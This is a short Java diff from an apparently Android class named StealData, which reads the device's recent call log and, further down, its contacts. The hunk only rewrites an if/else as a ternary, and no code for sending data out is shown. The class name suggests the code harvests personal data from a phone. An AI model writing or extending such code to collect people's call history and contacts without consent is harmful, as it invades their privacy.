@@ -11,12 +11,7 @@ public class StealData {
 		Cursor retrievedCalls = APIInteraction.retrieveCalls(act);
 		RecentCall[] callList = createCallList(retrievedCalls);	
 		retrievedCalls.close();
-		if(callList == null){
-			return null;
-		}
-		else{
-			return callList;
-		}	
+		return callList == null ? null:callList;
 	}
 	
 	public static ContactsList[] getContacts(Context act){
